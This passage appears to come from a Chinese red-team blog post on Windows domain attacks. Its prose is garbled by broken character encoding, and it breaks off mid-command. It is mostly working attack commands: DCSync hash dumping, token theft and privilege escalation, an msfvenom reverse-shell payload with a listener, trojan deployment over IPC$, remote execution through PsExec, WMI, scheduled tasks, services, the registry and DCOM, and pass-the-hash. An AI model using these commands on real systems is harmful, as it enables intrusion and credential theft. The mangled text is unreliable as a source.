ä¸ºå®ƒå¯ä»¥ä»åŸŸç®¡ç†å‘˜çš„ä¸Šä¸‹æ–‡ä¸­è·å¾—æ‰§è¡Œæƒé™ã€‚å› æ­¤å®ƒæ˜¯çº¢é˜Ÿçš„åŸºæœ¬æ“ä½œï¼Œå› ä¸ºå®ƒä¸é‚£ä¹ˆå¤æ‚ã€‚</p><p>æå–åŸŸä¸­æ‰€æœ‰ç”¨æˆ·HASH</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/62.png" alt="image-20200803215925120"></p><p>å¦‚æœè¦è·å–æŒ‡å®šçš„ç”¨æˆ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:ascotbe.com &#x2F;user:admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/63.png" alt="image-20200803220106374"></p><h4 id="AccessTokençªƒå–"><a href="#AccessTokençªƒå–" class="headerlink" title="AccessTokençªƒå–"></a>AccessTokençªƒå–</h4><blockquote><p>ä»¤ç‰Œ(Token)</p></blockquote><p><strong>ä»¤ç‰Œ(token)æ˜¯ç³»ç»Ÿçš„ä¸´æ—¶ç§˜é’¥ï¼Œç›¸å½“äºè´¦å·å’Œå¯†ç </strong>ï¼Œç”¨æ¥å†³å®šæ˜¯å¦å…è®¸è¿™æ¬¡è¯·æ±‚å’Œåˆ¤æ–­è¿™æ¬¡è¯·æ±‚æ˜¯å±äºå“ªä¸€ä¸ªç”¨æˆ·çš„ã€‚å®ƒå…è®¸ä½ åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„å‰æä¸‹ï¼Œ<strong>è®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æº</strong>ï¼Œè¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­ï¼Œé™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨ã€‚ä»¤ç‰Œæœ€å¤§çš„ç‰¹ç‚¹å°±æ˜¯éšæœºæ€§ï¼Œä¸å¯é¢„æµ‹ï¼Œé»‘å®¢æˆ–è½¯ä»¶æ— æ³•çŒœæµ‹å‡ºä»¤ç‰Œã€‚</p><p><strong>å‡å†’ä»¤ç‰Œå¯ä»¥å‡å†’ä¸€ä¸ªç½‘ç»œä¸­çš„å¦ä¸€ä¸ªç”¨æˆ·è¿›è¡Œå„ç±»æ“ä½œã€‚æ‰€ä»¥å½“ä¸€ä¸ªæ”»å‡»è€…éœ€è¦åŸŸç®¡ç†å‘˜çš„æ“ä½œæƒé™æ—¶å€™ï¼Œéœ€è¦é€šè¿‡å‡å†’åŸŸç®¡ç†å‘˜çš„ä»¤ç‰Œè¿›è¡Œæ”»å‡»ã€‚</strong></p><p><strong>ä»¤ç‰Œæœ‰å¾ˆå¤šç§ï¼š</strong></p><ul><li>è®¿é—®ä»¤ç‰Œ(Access Token)ï¼šè¡¨ç¤ºè®¿é—®æ§åˆ¶æ“ä½œä¸»ä½“çš„ç³»ç»Ÿå¯¹è±¡</li><li>ä¼šè¯ä»¤ç‰Œ(Session Token)ï¼šæ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦</li><li>å¯†ä¿ä»¤ç‰Œ(Security Token)ï¼šåˆå«åšè®¤è¯ä»¤ç‰Œæˆ–ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡ï¼Œä¾‹å¦‚Uç›¾</li></ul><p><strong>Windowsçš„AccessTokenæœ‰ä¸¤ç§ç±»å‹ï¼š</strong></p><ul><li><strong>Delegation Tokenï¼šæˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ä¼šè¯ç™»å½•</strong> (ä¾‹å¦‚æœ¬åœ°ç”¨æˆ·ç›´æ¥ç™»å½•ã€è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®)</li><li><strong>Impresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯</strong> (ä¾‹å¦‚ä½¿ç”¨net useè®¿é—®å…±äº«æ–‡ä»¶å¤¹)ã€‚</li></ul><p><strong>æ³¨ï¼š</strong> ä¸¤ç§tokenåªåœ¨ç³»ç»Ÿé‡å¯åæ¸…é™¤ å…·æœ‰Delegation tokençš„ç”¨æˆ·åœ¨æ³¨é”€åï¼Œè¯¥Tokenå°†å˜æˆImpersonation tokenï¼Œä¾æ—§æœ‰æ•ˆã€‚</p><p>ç›®å‰æœ‰ä¸‰ç§åˆ©ç”¨æ–¹å¼incognito.exeç¨‹åº ã€InvokeTokenManipulat.ps1è„šæœ¬ ã€MSFé‡Œçš„incognitoæ¨¡å—</p><h5 id="ç¨‹åºincognito"><a href="#ç¨‹åºincognito" class="headerlink" title="ç¨‹åºincognito"></a>ç¨‹åºincognito</h5><p>ä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;labs.mwrinfosecurity.com&#x2F;assets&#x2F;BlogFiles&#x2F;incognito2.zip</span><br></pre></td></tr></table></figure><p><strong>AccessTokençš„åˆ—ä¸¾</strong>(éœ€è¦administratoræƒé™)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\incognito.exe list_tokens -u</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/64.png" alt="image-20200803221305645"></p><p>å¯ä»¥çœ‹åˆ°Tokenéƒ½åˆ—ä¸¾å‡ºæ¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å¤åˆ¶tokenç„¶åå³å¯ææƒï¼Œä¹Ÿå¯ä»¥è¿›è¡Œé™æƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ææƒè‡³system</span></span><br><span class="line">.\incognito.exe execute -c <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/65.png" alt="image-20200803221740843"></p><h5 id="MSFä¸‹çš„incognitoæ¨¡å—"><a href="#MSFä¸‹çš„incognitoæ¨¡å—" class="headerlink" title="MSFä¸‹çš„incognitoæ¨¡å—"></a>MSFä¸‹çš„incognitoæ¨¡å—</h5><p>é¦–å…ˆç”Ÿæˆè¿›ç¨‹è®©æˆ‘ä»¬çš„kaliè¿æ¥åˆ°åŸŸæ§ä¸­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.183.138  LPORT=6666 -e x86/shikata_ga_nai -i 5 -b <span class="string">&quot;\x00&quot;</span> -f exe &gt;test.exe</span><br></pre></td></tr></table></figure><p>ç„¶åç›‘å¬è¿›ç¨‹è¿æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT 6666</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.183.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>è¿æ¥ä¸Šåå°±å¯ä»¥ç›´æ¥ææƒäº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use incognito <span class="comment">#åŠ è½½incognito</span></span><br><span class="line">list_tokens -u <span class="comment">#åˆ—å‡ºAccessToken</span></span><br><span class="line">getuid    <span class="comment">#æŸ¥çœ‹å½“å‰token</span></span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="comment">#æ¨¡æ‹Ÿsystemç”¨æˆ·ï¼Œgetsystemå‘½ä»¤å³å®ç°äº†è¯¥å‘½ä»¤ã€‚å¦‚æœè¦æ¨¡æ‹Ÿå…¶ä»–ç”¨æˆ·ï¼Œå°†tokenåæ”¹ä¸ºå…¶ä»–ç”¨æˆ·å³å¯</span></span><br><span class="line">steal_token 1252 <span class="comment">#ä»è¿›ç¨‹çªƒå–token</span></span><br><span class="line">getsystem <span class="comment">#æå‡è‡³systemæƒé™</span></span><br><span class="line">rev2self <span class="comment">#è¿”å›åˆ°ä¹‹å‰çš„AccessTokenæƒé™</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-TokenManipulation-ps1è„šæœ¬"><a href="#Invoke-TokenManipulation-ps1è„šæœ¬" class="headerlink" title="Invoke-TokenManipulation.ps1è„šæœ¬"></a>Invoke-TokenManipulation.ps1è„šæœ¬</h5><p>ä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;blob&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-TokenManipulation.ps1</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¼å…¥è„šæœ¬</span></span><br><span class="line">Import-Module .\Invoke-TokenManipulation.ps1</span><br><span class="line"><span class="comment">#åˆ—ä¸¾token</span></span><br><span class="line">Invoke-TokenManipulation -Enumerate</span><br><span class="line"><span class="comment">#ææƒè‡³system</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -Username <span class="string">&quot;nt authoritysystem&quot;</span></span><br><span class="line"><span class="comment">#å¤åˆ¶(çªƒå–)è¿›ç¨‹token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ProcessId 500</span><br><span class="line"><span class="comment">#å¤åˆ¶(çªƒå–)çº¿ç¨‹token</span></span><br><span class="line">Invoke-TokenManipulation -CreateProcess <span class="string">&quot;cmd.exe&quot;</span> -ThreadId 500</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/66.png" alt="image-20200803225323734"></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/67.png" alt="image-20200803225536976"></p><h5 id="åˆ©ç”¨tokenè·å¾—TrustedInstalleræƒé™"><a href="#åˆ©ç”¨tokenè·å¾—TrustedInstalleræƒé™" class="headerlink" title="åˆ©ç”¨tokenè·å¾—TrustedInstalleræƒé™"></a>åˆ©ç”¨tokenè·å¾—TrustedInstalleræƒé™</h5><p>åœ¨Windowsç³»ç»Ÿä¸­ï¼Œå³ä½¿è·å¾—äº†ç®¡ç†å‘˜æƒé™å’Œsystemæƒé™ï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶</p><p>å› ä¸ºWindowsç³»ç»Ÿçš„æœ€é«˜æƒé™ä¸º<strong>TrustedInstaller</strong></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ‹¥æœ‰<strong>SYSTEM</strong>æƒé™ä¹Ÿæ— æ³•åœ¨ç›®å½•<code>C:\Windows\servicing</code>ä¸‹å†™å…¥æ–‡ä»¶</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/68.png" alt="image-20200803225848113"></p><p>ä½†æ˜¯<strong>TrustedInstaller.exe</strong>æ˜¯æœ‰è¿™ä¸ªæƒé™çš„ï¼Œå¯ä»¥é€šè¿‡<code>Get-Acl -Path C:\Windows\servicing\TrustedInstaller.exe |select Owner</code>æ¥æŸ¥çœ‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/69.png" alt="image-20200803231351000"></p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>sc.exe start TrustedInstaller</code>æ¥å¯åŠ¨è¿™ä¸ªæœåŠ¡ï¼Œç„¶åæ‰¾åˆ°è¿™ä¸ªè¿›ç¨‹ï¼Œé€šè¿‡çªƒå–è¿™ä¸ªè¿›ç¨‹çš„Tokenæ¥æå‡æƒé™</p><p>å¯ä»¥çœ‹åˆ°ä¸‹å›¾è™½ç„¶æˆ‘ä»¬è¿˜æ˜¯systemçš„æƒé™ï¼Œä½†æ˜¯æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨<code>C:\Windows\servicing</code>ç›®å½•ä¸‹é¢å†™å…¥æ–‡ä»¶äº†ï¼ŒåŒç†MSFä¸­çš„incognitoæ¨¡å—ä¹Ÿèƒ½æˆåŠŸ</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/70.png" alt="image-20200803231243500"></p><h3 id="å¯†ç å–·å°„"><a href="#å¯†ç å–·å°„" class="headerlink" title="å¯†ç å–·å°„"></a>å¯†ç å–·å°„</h3><p>å¼±å£ä»¤ï¼Œæ°¸è¿œæ”¹ä¸å®Œã€‚åœ¨å†…ç½‘ä¸­ï¼Œä¹Ÿå¯ä»¥å°è¯•å¯¹smbã€3389ã€mssqlå¼±å£ä»¤è¿›è¡Œå¯†ç æš´åŠ›ç ´è§£ï¼Œä½†æ˜¯è¦æ³¨æ„çº¿ç¨‹ï¼Œå¯†ç æ•°ä¸è¦å¤ªå¤šã€‚å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸åŒè´¦å·ï¼ŒåŒä¸ªå¯†ç è¿›è¡Œå°è¯•ã€‚è¿™é‡Œä½¿ç”¨kerbruteå¯¹åŸŸç”¨æˆ·/å¯†ç è¿›è¡Œæš´åŠ›ç ´è§£</p><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ropnop&#x2F;kerbrute</span><br></pre></td></tr></table></figure><p>è¿™é¡¹ç›®éœ€è¦ä½¿ç”¨å­—å…¸æ¥æšä¸¾ç”¨æˆ·æˆ–è€…æšä¸¾å¯†ç ï¼Œè¿™é‡Œå°±æ‡’å¾—æ¼”ç¤ºäº†</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>ç•™ä¸ªå‘ï¼Œè¿™ä¸ªè¿˜ä¸æ˜¯å¾ˆæ˜ç™½</p><h2 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h2><p>å…¨ç¨‹ä½¿ç”¨windows 10 è¿æ¥æˆ‘ä»¬çš„åŸŸæ§ windows 2008 </p><ul><li>åŸŸæ§IPï¼š <strong>192.168.183.143</strong></li><li>ç”¨æˆ·åï¼š<strong>administrator</strong></li><li>å¯†ç ï¼š<strong>XXXXXX</strong></li></ul><h3 id="è´¦å·å¯†ç é“¾æ¥"><a href="#è´¦å·å¯†ç é“¾æ¥" class="headerlink" title="è´¦å·å¯†ç é“¾æ¥"></a>è´¦å·å¯†ç é“¾æ¥</h3><p>å½“æˆ‘ä»¬è·å–åˆ°æœºå™¨çš„è´¦å·å¯†ç çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•ç”¨ä»¥ä¸‹å‡ ç§æ–¹å¼è¿›è¡Œè¿æ¥å¹¶æ‰§è¡Œå‘½ä»¤ã€‚</p><h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h4><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><ul><li><strong>139</strong> or <strong>445</strong>ç«¯å£å¼€å¯</li><li>ç®¡ç†å‘˜å¼€å¯é»˜è®¤å…±äº«</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\1.1.1.1\ipc$  &quot;password&quot; &#x2F;user:username</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/71.png" alt="image-20200805211744299"></p><p>å»ºç«‹å¥½è¿æ¥åå¯ä»¥æŠŠå¯¹æ–¹çš„Cç›˜æ˜ å°„åˆ°è‡ªå·±çš„Zç›˜ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use z: \\192.168.183.143\c$</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/72.png" alt="image-20200805211845297"></p><p>è¿˜èƒ½æ‰§è¡Œæœ¨é©¬æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#å»ºç«‹å¥½IPCåï¼ŒæŠŠshell.exeå¤åˆ¶åˆ°ç›®æ ‡æœºå™¨ä¸Š(è¿™é‡Œçš„$æ˜¯æŒ‡adminç”¨æˆ·çš„c:\winnt\system32\)</span><br><span class="line">copy shell.exe \\1.1.1.1\admin$</span><br><span class="line">#ç„¶åæŸ¥çœ‹ç›®æ ‡æœºå™¨çš„æ—¶é—´</span><br><span class="line">net time \\127.0.0.1</span><br><span class="line">#ç”¨atå‘½ä»¤è®©ç›®æ ‡æœºå™¨12ç‚¹æ‰§è¡Œshell.exeæ–‡ä»¶</span><br><span class="line">at \1.1.1.1 12:00 shell.exe</span><br></pre></td></tr></table></figure><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>ç›´æ¥å»å¾®è½¯å®˜ç½‘ä¸‹è½½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;sysinternals&#x2F;downloads&#x2F;psexec</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å¥½æŠŠæ–‡ä»¶æå–å‡ºæ¥å°±è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ç”¨æœåŠ¡å¯åŠ¨çš„æ–¹å¼ï¼š</span><br><span class="line">.\PsExec.exe  \\1.1.1.1 -accepteula -u username -p  password cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/73.png" alt="image-20200805212914831"></p><h4 id="WMI-amp-WINRM"><a href="#WMI-amp-WINRM" class="headerlink" title="WMI&amp;WINRM"></a>WMI&amp;WINRM</h4><p><strong>æ–¹æ³•ä¸€</strong></p><p>åˆ›å»ºè®°äº‹æœ¬è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic  /user:<span class="string">&quot;ascotbe.com\administrator&quot;</span>  /password:<span class="string">&quot;password&quot;</span>  /node:1.1.1.1 process call create <span class="string">&quot;notepad&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/74.png" alt="image-20200805213359196"></p><p>ç„¶åçœ‹åŸŸæ§ä¸­çš„è¿›ç¨‹</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/75.png" alt="image-20200805213420618"></p><p><strong>æ–¹æ³•äºŒ</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WmiMethod  -class win32_process -name create -argumentlist <span class="string">&#x27;notepad&#x27;</span> -ComputerName  1.1.1.1 -Credential <span class="string">&#x27;ascotbe.com\administrator&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>æ–¹æ³•ä¸‰</strong></p><p>ç›´æ¥ç”¨360çµè…¾å®éªŒå®¤çš„å·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/360-Linton-Lab/WMIHACKER</span><br></pre></td></tr></table></figure><p>æœ‰å›æ˜¾æŸ¥çœ‹whoami</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/76.png" alt="image-20200805220346919"></p><p>è¿˜æœ‰æ–‡ä»¶ä¸‹è½½ã€ä¸Šä¼ ã€æ¨¡æ‹Ÿshellç­‰æ¨¡å¼</p><h4 id="Schtasks"><a href="#Schtasks" class="headerlink" title="Schtasks"></a>Schtasks</h4><p>å®šæ—¶ä»»åŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /create /s 1.1.1.1 /u domain\Administrator /p password /ru <span class="string">&quot;SYSTEM&quot;</span>  /tn <span class="string">&quot;windowsupdate&quot;</span> /sc DAILY  /tr <span class="string">&quot;calc&quot;</span> /F</span><br><span class="line">schtasks /run /s 1.1.1.1 /u domain\Administrator /p password /tn windowsupdate</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/77.png" alt="image-20200805220733211"></p><p>ç„¶åæŸ¥çœ‹æˆ‘ä»¬åŸŸæ§ï¼Œå¯ä»¥å‘ç°åå°å¯åŠ¨äº†è®¡ç®—å™¨å¹¶ä¸”æ˜¯SYSTEMæƒé™</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/78.png" alt="image-20200805220811976"></p><h4 id="AT"><a href="#AT" class="headerlink" title="AT"></a>AT</h4><p>è¿™ä¸ªå°±æ˜¯è®¡åˆ’ä»»åŠ¡ä¸Šé¢IPCçš„æ—¶å€™è®²äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at  \\1.1.1.1 15:15 calc</span><br></pre></td></tr></table></figure><h4 id="SC"><a href="#SC" class="headerlink" title="SC"></a>SC</h4><p>è¿™ä¸ªå’Œä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡ç±»ä¼¼ï¼Œå¯åŠ¨è®¡ç®—å™¨è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc  \\1.1.1.1 create windowsupdate binpath= <span class="string">&quot;calc&quot;</span></span><br><span class="line">sc  \\1.1.1.1 start windowsupdate</span><br></pre></td></tr></table></figure><h4 id="REG"><a href="#REG" class="headerlink" title="REG"></a>REG</h4><p>åˆ©ç”¨æ³¨å†Œåˆ—è¡¨æ¥æ·»åŠ è®¡ç®—å™¨è¿›ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add  \\1.1.1.1\HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v myentry /t  REG_SZ /d <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><h4 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="variable">$com</span>  = [activator]::CreateInstance([<span class="built_in">type</span>]::GetTypeFromProgID(<span class="string">&quot;MMC20.Application&quot;</span>,<span class="string">&quot;1.1.1.1&quot;</span>))</span><br><span class="line"><span class="variable">$com</span>.Document.ActiveView.ExecuteShellCommand(<span class="string">&#x27;cmd.exe&#x27;</span>,<span class="variable">$null</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;Minimized&quot;</span>)</span><br><span class="line"><span class="comment">#  æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$item</span>  = <span class="variable">$obj</span>.item()</span><br><span class="line"><span class="variable">$item</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br><span class="line"><span class="comment">#  æ–¹æ³•ä¸‰</span></span><br><span class="line"><span class="variable">$com</span>  = [Type]::GetTypeFromCLSID(<span class="string">&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;</span>,<span class="string">&quot;1.1.1.1&quot;</span>)</span><br><span class="line"><span class="variable">$obj</span>  = [System.Activator]::CreateInstance(<span class="variable">$com</span>)</span><br><span class="line"><span class="variable">$obj</span>.Document.Application.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c  calc.exe&quot;</span>,<span class="string">&quot;c:\windows\system32&quot;</span>,<span class="variable">$null</span>,0)</span><br></pre></td></tr></table></figure><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>å½“æˆ‘ä»¬æ²¡æœ‰æ˜æ–‡è´¦å·å¯†ç ï¼Œåªæœ‰hashæ—¶ï¼Œå¯ä»¥å°è¯•hashä¼ é€’ã€‚</p><h4 id="impacketå¥—ä»¶"><a href="#impacketå¥—ä»¶" class="headerlink" title="impacketå¥—ä»¶"></a>impacketå¥—ä»¶</h4><p>é¡¹ç›®ä¸‹è½½åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œä¸ªwhoamiå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python  wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc domain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/79.png" alt="image-20200805223113417"></p><p>å…¶ä»–æ–¹æ³•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ©ç”¨ä¸Šé¢è®²è¿‡çš„psexec</span></span><br><span class="line">psexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc     domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="comment">#åˆ©ç”¨smbexec</span></span><br><span class="line">smbexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:208976c3facce54a3b6b003fcae5d6dc   domiain/administrator@1.1.1.1 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><h4 id="Invoke-TheHashå¥—ä»¶"><a href="#Invoke-TheHashå¥—ä»¶" class="headerlink" title="Invoke-TheHashå¥—ä»¶"></a>Invoke-TheHashå¥—ä»¶</h4><p>é¡¹ç›®åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;Kevin-Robertson&#x2F;Invoke-TheHash&#x2F;</span><br></pre></td></tr></table></figure><p>ä¸¤ç§æ–¹å¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command <span class="string">&quot;calc.exe&quot;</span> -verbose</span><br><span class="line">Invoke-SMBExec  -Target 1.1.1.1 